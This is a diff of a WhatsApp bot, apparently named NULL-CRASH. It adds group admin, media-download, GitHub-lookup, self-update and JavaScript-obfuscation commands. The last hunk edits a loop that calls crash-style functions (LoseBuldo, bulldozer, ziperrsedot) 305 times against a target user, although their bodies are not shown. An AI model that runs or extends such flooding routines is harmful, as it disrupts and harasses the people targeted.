+├◆ Failed to demote user
+├◆ ${err.message}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    }
+}
+break;
+
+// ================= ADD MEMBER ======================
+case 'add': {
+    if (!m.isGroup) return reply(`┌⪼❏ GROUP ONLY
+├◆ This command can only be used in groups
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    if (!isAdmins) return reply(`┌⪼❏ ACCESS DENIED
+├◆ Only group admins can use this command
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    if (!isBotAdmins) return reply(`┌⪼❏ BOT NOT ADMIN
+├◆ Bot must be admin to add members
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    let user = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+    if (!user || user === '@s.whatsapp.net') return reply(`┌⪼❏ ADD MEMBER
+├◆ Please provide a valid number
+├◆ USAGE: .add 2347030626048
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    try {
+        await minato.groupParticipantsUpdate(m.chat, [user], 'add');
+        reply(`┌⪼❏ MEMBER ADDED
+├◆ User: @${user.split('@')[0]}
+├◆ Successfully added to group
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    } catch (err) {
+        reply(`┌⪼❏ ERROR
+├◆ Failed to add user
+├◆ ${err.message}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    }
+}
+break;
+
+// ================= GROUP LINK ======================
+case 'gclink':
+case 'linkgc':
+case 'grouplink': {
+    if (!m.isGroup) return reply(`┌⪼❏ GROUP ONLY
+├◆ This command can only be used in groups
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    if (!isAdmins) return reply(`┌⪼❏ ACCESS DENIED
+├◆ Only group admins can use this command
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    if (!isBotAdmins) return reply(`┌⪼❏ BOT NOT ADMIN
+├◆ Bot must be admin to get group link
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    try {
+        let code = await minato.groupInviteCode(m.chat);
+        let link = 'https://chat.whatsapp.com/' + code;
+        reply(`┌⪼❏ GROUP LINK
+├◆ Group: ${groupName}
+├◆ Link: ${link}
+├◆ Code: ${code}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    } catch (err) {
+        reply(`┌⪼❏ ERROR
+├◆ Failed to get group link
+├◆ ${err.message}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    }
+}
+break;
+
+// ================= REVOKE LINK ======================
+case 'revoke':
+case 'resetlink': {
+    if (!m.isGroup) return reply(`┌⪼❏ GROUP ONLY
+├◆ This command can only be used in groups
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    if (!isAdmins) return reply(`┌⪼❏ ACCESS DENIED
+├◆ Only group admins can use this command
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    if (!isBotAdmins) return reply(`┌⪼❏ BOT NOT ADMIN
+├◆ Bot must be admin to revoke link
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    try {
+        await minato.groupRevokeInvite(m.chat);
+        reply(`┌⪼❏ LINK REVOKED
+├◆ Group: ${groupName}
+├◆ Old invite link has been revoked
+├◆ Use .gclink to get new link
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    } catch (err) {
+        reply(`┌⪼❏ ERROR
+├◆ Failed to revoke link
+├◆ ${err.message}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    }
+}
+break;
+
+// ================= GROUP INFO ======================
+case 'groupinfo':
+case 'ginfo': {
+    if (!m.isGroup) return reply(`┌⪼❏ GROUP ONLY
+├◆ This command can only be used in groups
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    let totalAdmins = groupAdmins.length;
+    let created = new Date(groupMetadata.creation * 1000).toLocaleDateString();
+    
+    reply(`┌⪼❏ GROUP INFO
+├◆ Name: ${groupName}
+├◆ ID: ${m.chat}
+├◆ Created: ${created}
+├◆ Total Members: ${participants.length}
+├◆ Admins: ${totalAdmins}
+├◆ Owner: @${groupMetadata.owner?.split('@')[0] || 'Unknown'}
+├◆ Description: ${groupMetadata.desc || 'None'}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+}
+break;
+
+// ================= HIDETAG ======================
+case 'hidetag':
+case 'ht': {
+    if (!m.isGroup) return reply(`┌⪼❏ GROUP ONLY
+├◆ This command can only be used in groups
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    if (!isAdmins) return reply(`┌⪼❏ ACCESS DENIED
+├◆ Only group admins can use this command
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    let message = text || 'Hello everyone!';
+    let mentions = participants.map(p => p.id);
+    
+    await minato.sendMessage(m.chat, {
+        text: message,
+        mentions: mentions
+    }, { quoted: m });
+}
+break;
+
+// ================= DELETE MESSAGE ======================
+case 'delete':
+case 'del':
+case 'd': {
+    if (!m.quoted) return reply(`┌⪼❏ DELETE
+├◆ Reply to the message you want to delete
+├◆ USAGE: Reply to message with .delete
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    try {
+        await minato.sendMessage(m.chat, { delete: m.quoted.key });
+        await minato.sendMessage(m.chat, { delete: m.key });
+    } catch (err) {
+        reply(`┌⪼❏ ERROR
+├◆ Failed to delete message
+├◆ Bot must be admin or message must be from bot
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    }
+}
+break;
+// ================= TWITTER/X DOWNLOAD ======================
+case 'twitter':
+case 'x':
+case 'twt': {
+    if (!text) return reply(`┌⪼❏ TWITTER DL
+├◆ Please provide a Twitter/X URL
+├◆ USAGE: .twitter https://twitter.com/user/status/xxx
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    try {
+        await minato.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
+        let res = await axios.get(`https://api.vreden.my.id/api/twitter?url=${encodeURIComponent(text)}`);
+        let data = res.data;
+        
+        if (data.result && data.result.url) {
+            await minato.sendMessage(m.chat, {
+                video: { url: data.result.url },
+                caption: `┌⪼❏ TWITTER DOWNLOADED
+├◆ Quality: ${data.result.quality || 'HD'}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`
+            }, { quoted: m });
+            await minato.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+        } else {
+            reply(`┌⪼❏ ERROR
+├◆ No media found in this tweet
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+        }
+    } catch (err) {
+        reply(`┌⪼❏ ERROR
+├◆ Failed to download Twitter media
+├◆ ${err.message}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    }
+}
+break;
+
+// ================= SPOTIFY DOWNLOAD ======================
+case 'spotify':
+case 'spoty': {
+    if (!text) return reply(`┌⪼❏ SPOTIFY DL
+├◆ Please provide a Spotify URL
+├◆ USAGE: .spotify https://open.spotify.com/track/xxx
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    try {
+        await minato.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
+        let res = await axios.get(`https://api.vreden.my.id/api/spotifydl?url=${encodeURIComponent(text)}`);
+        let data = res.data;
+        
+        if (data.result && data.result.download) {
+            await minato.sendMessage(m.chat, {
+                audio: { url: data.result.download },
+                mimetype: 'audio/mp4',
+                caption: `┌⪼❏ SPOTIFY DOWNLOADED
+├◆ Title: ${data.result.title || 'Unknown'}
+├◆ Artist: ${data.result.artist || 'Unknown'}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`
+            }, { quoted: m });
+            await minato.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+        } else {
+            reply(`┌⪼❏ ERROR
+├◆ Failed to download from Spotify
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+        }
+    } catch (err) {
+        reply(`┌⪼❏ ERROR
+├◆ Failed to download Spotify track
+├◆ ${err.message}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    }
+}
+break;
+
+// ================= MEDIAFIRE DOWNLOAD ======================
+case 'mediafire':
+case 'mf': {
+    if (!text) return reply(`┌⪼❏ MEDIAFIRE DL
+├◆ Please provide a MediaFire URL
+├◆ USAGE: .mediafire https://www.mediafire.com/file/xxx
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    try {
+        await minato.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
+        let res = await axios.get(`https://api.vreden.my.id/api/mediafiredl?url=${encodeURIComponent(text)}`);
+        let data = res.data;
+        
+        if (data.result && data.result.url) {
+            reply(`┌⪼❏ MEDIAFIRE DOWNLOADED
+├◆ Filename: ${data.result.filename}
+├◆ Size: ${data.result.filesize}
+├◆ Type: ${data.result.filetype}
+├◆ Link: ${data.result.url}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+            await minato.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+        } else {
+            reply(`┌⪼❏ ERROR
+├◆ Failed to get MediaFire file
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+        }
+    } catch (err) {
+        reply(`┌⪼❏ ERROR
+├◆ Failed to download from MediaFire
+├◆ ${err.message}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    }
+}
+break;
+
+// ================= PINTEREST DOWNLOAD ======================
+case 'pinterest':
+case 'pin': {
+    if (!text) return reply(`┌⪼❏ PINTEREST DL
+├◆ Please provide a Pinterest URL
+├◆ USAGE: .pinterest https://pin.it/xxx
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    try {
+        await minato.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
+        let res = await axios.get(`https://api.vreden.my.id/api/pinterestdl?url=${encodeURIComponent(text)}`);
+        let data = res.data;
+        
+        if (data.result && data.result.url) {
+            await minato.sendMessage(m.chat, {
+                image: { url: data.result.url },
+                caption: `┌⪼❏ PINTEREST DOWNLOADED
+├◆ Title: ${data.result.title || 'Unknown'}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`
+            }, { quoted: m });
+            await minato.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+        } else {
+            reply(`┌⪼❏ ERROR
+├◆ Failed to download from Pinterest
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+        }
+    } catch (err) {
+        reply(`┌⪼❏ ERROR
+├◆ Failed to download Pinterest media
+├◆ ${err.message}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    }
+}
+break;
+// ================= GITHUB STALK ======================
+case 'githubstalk':
+case 'ghstalk': {
+    if (!text) return reply(`┌⪼❏ GITHUB STALK
+├◆ Please provide a GitHub username
+├◆ USAGE: .githubstalk username
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    try {
+        let res = await axios.get(`https://api.github.com/users/${text}`);
+        let data = res.data;
+        
+        let result = `┌⪼❏ GITHUB USER
+├◆ Username: ${data.login}
+├◆ Name: ${data.name || 'Not set'}
+├◆ Bio: ${data.bio || 'None'}
+├◆ Followers: ${data.followers}
+├◆ Following: ${data.following}
+├◆ Public Repos: ${data.public_repos}
+├◆ Public Gists: ${data.public_gists}
+├◆ Blog: ${data.blog || 'None'}
+├◆ Location: ${data.location || 'Unknown'}
+├◆ Twitter: ${data.twitter_username || 'None'}
+├◆ Company: ${data.company || 'None'}
+├◆ Created: ${new Date(data.created_at).toLocaleDateString()}
+├◆ Updated: ${new Date(data.updated_at).toLocaleDateString()}
+├◆ Profile: ${data.html_url}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`;
+        
+        await minato.sendMessage(m.chat, {
+            image: { url: data.avatar_url },
+            caption: result
+        }, { quoted: m });
+        
+    } catch (err) {
+        reply(`┌⪼❏ ERROR
+├◆ User not found or API error
+├◆ ${err.message}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    }
+}
+break;
+
+// ================= GITHUB REPO INFO ======================
+case 'ghrepo':
+case 'repoinfo': {
+    if (!text) return reply(`┌⪼❏ GITHUB REPO
+├◆ Please provide username/repo
+├◆ USAGE: .ghrepo username/repository
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    try {
+        let res = await axios.get(`https://api.github.com/repos/${text}`);
+        let data = res.data;
+        
+        let result = `┌⪼❏ REPOSITORY INFO
+├◆ Name: ${data.full_name}
+├◆ Description: ${data.description || 'None'}
+├◆ Stars: ${data.stargazers_count}
+├◆ Forks: ${data.forks_count}
+├◆ Watchers: ${data.watchers_count}
+├◆ Issues: ${data.open_issues_count}
+├◆ Language: ${data.language || 'Unknown'}
+├◆ License: ${data.license?.name || 'None'}
+├◆ Default Branch: ${data.default_branch}
+├◆ Created: ${new Date(data.created_at).toLocaleDateString()}
+├◆ Updated: ${new Date(data.updated_at).toLocaleDateString()}
+├◆ Topics: ${data.topics?.join(', ') || 'None'}
+├◆ URL: ${data.html_url}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`;
+        
+        await minato.sendMessage(m.chat, {
+            image: { url: data.owner.avatar_url },
+            caption: result
+        }, { quoted: m });
+        
+    } catch (err) {
+        reply(`┌⪼❏ ERROR
+├◆ Repository not found or API error
+├◆ ${err.message}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    }
+}
+break;
+
+// ================= GITHUB SEARCH ======================
+case 'ghsearch':
+case 'github': {
+    if (!text) return reply(`┌⪼❏ GITHUB SEARCH
+├◆ Please provide a search query
+├◆ USAGE: .ghsearch whatsapp-bot
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    try {
+        let res = await axios.get(`https://api.github.com/search/repositories?q=${encodeURIComponent(text)}&per_page=5`);
+        let data = res.data;
+        
+        if (data.items && data.items.length > 0) {
+            let repos = data.items.slice(0, 5).map((repo, i) => 
+                `${i + 1}. ${repo.full_name}
+   Stars: ${repo.stargazers_count} | Forks: ${repo.forks_count}
+   ${repo.description ? repo.description.slice(0, 60) + '...' : 'No description'}
+   ${repo.html_url}`
+            ).join('\n\n');
+            
+            reply(`┌⪼❏ GITHUB SEARCH
+├◆ Query: ${text}
+├◆ Total Results: ${data.total_count}
+├◆
+${repos}
+├◆
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+        } else {
+            reply(`┌⪼❏ NO RESULTS
+├◆ No repositories found for: ${text}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+        }
+    } catch (err) {
+        reply(`┌⪼❏ ERROR
+├◆ Search failed
+├◆ ${err.message}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    }
+}
+break;
+// ================= UPDATE BOT ======================
+case 'update':
+case 'upgrade': {
+    if (!isCreator) return reply(`┌⪼❏ ACCESS DENIED
+├◆ Only bot owner can update
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    reply(`┌⪼❏ UPDATE CHECK
+├◆ Checking for updates...
+├◆ Current Version: ${global.versionBot}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    try {
+        let res = await axios.get('https://api.github.com/repos/KNOXPRIME/NULL-CRASH/contents/package.json');
+        let content = Buffer.from(res.data.content, 'base64').toString();
+        let remote = JSON.parse(content);
+        
+        if (remote.version !== global.versionBot) {
+            reply(`┌⪼❏ UPDATE AVAILABLE
+├◆ Current Version: ${global.versionBot}
+├◆ New Version: ${remote.version}
+├◆
+├◆ Updating bot...
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+            
+            // Download and replace files
+            let files = ['index.js', 'null.js', 'settings.js', 'package.json'];
+            for (let file of files) {
+                try {
+                    let fileRes = await axios.get(`https://raw.githubusercontent.com/KNOXPRIME/NULL-CRASH/main/${file}`);
+                    fs.writeFileSync(`./${file}`, fileRes.data);
+                } catch (e) {
+                    console.log(`Failed to update ${file}:`, e.message);
+                }
+            }
+            
+            reply(`┌⪼❏ UPDATE COMPLETE
+├◆ Bot updated to version ${remote.version}
+├◆ Restarting in 3 seconds...
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+            
+            setTimeout(() => process.exit(0), 3000);
+            
+        } else {
+            reply(`┌⪼❏ UP TO DATE
+├◆ Version: ${global.versionBot}
+├◆ No updates available
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+        }
+    } catch (err) {
+        reply(`┌⪼❏ UPDATE FAILED
+├◆ Could not check for updates
+├◆ Error: ${err.message}
+├◆ Check your GitHub repo settings
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    }
+}
+break;
+
+// ================= ( Case enc )=====================
+case 'enc':
+case 'nullenc':
+case 'encrypt': {
+const JsConfuser = require('js-confuser')
+
+if (!m.message.extendedTextMessage || !m.message.extendedTextMessage.contextInfo.quotedMessage) {
+return reply('❌ Please Reply File To Be Encryption.');
+}
+const quotedMessage = m.message.extendedTextMessage.contextInfo.quotedMessage;
+const quotedDocument = quotedMessage.documentMessage;
+if (!quotedDocument || !quotedDocument.fileName.endsWith('.js')) {
+return reply('❌ Please Reply File To Be Encryption.');
+}
+try {
+const fileName = quotedDocument.fileName;
+const docBuffer = await m.quoted.download();
+if (!docBuffer) {
+return reply('❌ Please Reply File To Be Encryption.');
+}
+await minato.sendMessage(m.chat, {
+ react: { text: '🕛', key: m.key }
+ });
+const obfuscatedCode = await JsConfuser.obfuscate(docBuffer.toString(), {
+target: "node",
+preset: "high",
+compact: true,
+minify: true,
+flatten: true,
+identifierGenerator: function () {
+const originalString = "素DET晴NULLXMD晴" + "素CODEBREAKER晴NULL晴";
+const removeUnwantedChars = (input) => input.replace(/[^a-zA-Z素CODEBREAKER晴DEVNULL晴]/g, "");
+const randomString = (length) => {
+let result = "";
+const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+for (let i = 0; i < length; i++) {
+result += characters.charAt(Math.floor(Math.random() * characters.length));
+}
+return result;
+};
+return removeUnwantedChars(originalString) + randomString(2);
+},
+renameVariables: true,
+renameGlobals: true,
+stringEncoding: true,
+stringSplitting: 0.0,
+stringConcealing: true,
+stringCompression: true,
+duplicateLiteralsRemoval: 1.0,
+shuffle: { hash: 0.0, true: 0.0 },
+stack: true,
+controlFlowFlattening: 1.0,
+opaquePredicates: 0.9,
+deadCode: 0.0,
+dispatcher: true,
+rgf: false,
+calculator: true,
+hexadecimalNumbers: true,
+movedDeclarations: true,
+objectExtraction: true,
+globalConcealing: true,
+});
+await minato.sendMessage(m.chat, {
+document: Buffer.from(obfuscatedCode, 'utf-8'),
+mimetype: 'application/javascript',
+fileName: `${fileName}`,
+caption: `•Successful Encrypt
+•Type: Hard Code
+> © 2026 𝗝𝗘𝗔𝗡 𝗦𝗧𝗘𝗣𝗛 𝗠𝗗-𝗫`,
+}, { quoted: HKQuoted });
+
+} catch (err) {
+console.error('Error during encryption:', err);
+await reply(`An error occurred: ${err.message}`);
+}
+}
+break;
+// ================= ( Case auto typing )=====================
+case 'autotyping': {
+    if (!isCreator) return reply("Owner only");
+
+    global.settings.autoTyping = args[0] === 'on';
+    reply(`⌨️ AutoTyping ${global.settings.autoTyping ? 'ON' : 'OFF'}`);
+}
+break;
+// ================= ( Case auto view status)=====================
+case 'autoviewstatus': {
+    if (!isCreator) return reply("Owner only");
+
+    if (args[0] === 'on') global.settings.autoViewStatus = true;
+    else if (args[0] === 'off') global.settings.autoViewStatus = false;
+    else return reply("Ex: autoviewstatus on/off");
+
+    reply(`👀 AutoViewStatus ${global.settings.autoViewStatus ? 'ON' : 'OFF'}`);
+}
+break;
+// ================= ( Case tag all )=====================
+case 'tagall': {
+    if (!isGroup) return reply('Group specific features!');
+
+    let teks = `*👥 HELLO EVERYONE*\n\n`;
+    let count = 1;
+
+    for (let mem of participants) {
+        teks += `${count}. 🎧 @${mem.id.split('@')[0]}\n`;
+        count++;
+    }
+
+    let ppuser;
+    try {
+        ppuser = await minato.profilePictureUrl(m.sender, 'image');
+    } catch {
+        ppuser = 'https://files.lordobitotech.xyz/mediafiles/911dcf24-50c6-47e5-bff6-31541fffd81b.jpg';
+    }
+    
+    await minato.sendMessage(m.chat, {
+        image: { url: ppuser },
+        caption: teks,
+         contextInfo: {
+                mentionedJid: [m.sender],
+                forwardingScore: 999,
+                isForwarded: true,
+                forwardedNewsletterMessageInfo: {
+                    newsletterJid: '120363402881295184@newsletter',
+                    newsletterName: '¿? JEAN STEPH TECH ¿?',
+                    serverMessageId: 143
+                }
+            },
+        mentions: participants.map(a => a.id)
+    }, {
+        quoted: m
+    });
+}
+break;
+// ================= ( Case kick )=====================
+case 'kick': {
+    if (!m.isGroup) return reply('Group only');
+    if (!isAdmins) return reply('Admin only');
+    if (!isBotAdmins) return reply('NULLXMD must be admin');
+
+    let user = m.mentionedJid[0] || (m.quoted && m.quoted.sender);
+
+    if (!user) return reply('❌ Tag or reply user');
+
+    await minato.groupParticipantsUpdate(m.chat, [user], 'remove');
+
+    reply('✅ User removed');
+}
+break;
+// ================= ( Case unmute gc )=====================
+case 'unmute': {
+    if (!m.isGroup) return reply('Group only');
+    if (!isAdmins) return reply('Admin only');
+    if (!isBotAdmins) return reply('Bot must be admin');
+
+    await minato.groupSettingUpdate(m.chat, 'not_announcement');
+
+    reply('🔊 Group opened');
+}
+break;     
+// ================= ( Case mute gc)=====================
+case 'mute': {
+    if (!m.isGroup) return reply('Group only');
+    if (!isAdmins) return reply('Admin only');
+    if (!isBotAdmins) return reply('Bot must be admin');
+
+    await minato.groupSettingUpdate(m.chat, 'announcement');
+
+    reply('🔇 Group closed');
+}
+break;
+// ================= ( Case fb )=====================
+case 'fb': {
+    if (!text) return reply('❌ Enter Facebook URL');
+
+    try {
+        let res = await axios.get(`https://api.vreden.my.id/api/fbdl?url=${text}`);
+        let data = res.data;
+
+        await minato.sendMessage(m.chat, {
+            video: { url: data.result.url },
+            caption: '✅ Facebook Downloaded'
+        }, { quoted: m });
+
+    } catch {
+        reply('❌ Error downloading Facebook video');
+    }
+}
+break;
+// ================= ( Case insta )=====================
+case 'insta': {
+    if (!text) return reply('❌ Enter Instagram URL');
+
+    try {
+        let res = await axios.get(`https://api.vreden.my.id/api/igdl?url=${text}`);
+        let data = res.data;
+
+        await minato.sendMessage(m.chat, {
+            video: { url: data.result[0].url },
+            caption: '✅ Instagram Downloaded'
+        }, { quoted: m });
+
+    } catch {
+        reply('❌ Error downloading Instagram');
+    }
+}
+break;
+// ================= ( Case tiktok )=====================
+case 'tiktok': {
+    if (!text) return reply('❌ Enter TikTok URL');
+
+    try {
+        let res = await axios.get(`https://api.tiklydown.eu.org/api/download?url=${text}`);
+        let data = res.data;
+
+        await minato.sendMessage(m.chat, {
+            video: { url: data.video.noWatermark },
+            caption: '✅ TikTok Downloaded'
+        }, { quoted: m });
+
+    } catch {
+        reply('❌ Error downloading TikTok');
+    }
+}
+break;
+// ================= ( Case ping )=====================
+// ================= ( Case checkchannel )=====================
+case "cekidch": case "idch": {
+if (!text) return reply("*Put link*")
+if (!text.includes("https://whatsapp.com/channel/")) return m.reply("*Link Is Not For Valid Channel*")
+let result = text.split('https://whatsapp.com/channel/')[1]
+let res = await minato.newsletterMetadata("invite", result)
+let teks = `
+* *ID :* ${res.id}
+* *Name :* ${res.name}
+* *Total followers :* ${res.subscribers}
+* *Status :* ${res.state}
+* *Verified :* ${res.verification == "VERIFIED" ? "YES" : "NO"}
+`
+return reply(teks)
+}
+break
 // ================= ( Case Self )=====================
 case "self":{
   if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
@@ -1446,17 +2764,17 @@ await doneress();
 
    for (let i = 0; i < 305; i++) {
 
-     await LoseBuldo(target);
+     await LoseBuldo(minato, target);
      sleep(2000)
-     await LoseBuldo(target);
+     await LoseBuldo(minato, target);
      sleep(2000)
-     await LoseBuldo(target);
-     sleep(2000)
-     await bulldozer(minato, target);
+     await LoseBuldo(minato, target);
      sleep(2000)
      await bulldozer(minato, target);
      sleep(2000)
-     await ziperrsedot(target, true) 
+     await bulldozer(minato, target);
+     sleep(2000)
+     await ziperrsedot(minato, target, true) 
    
  
  }   
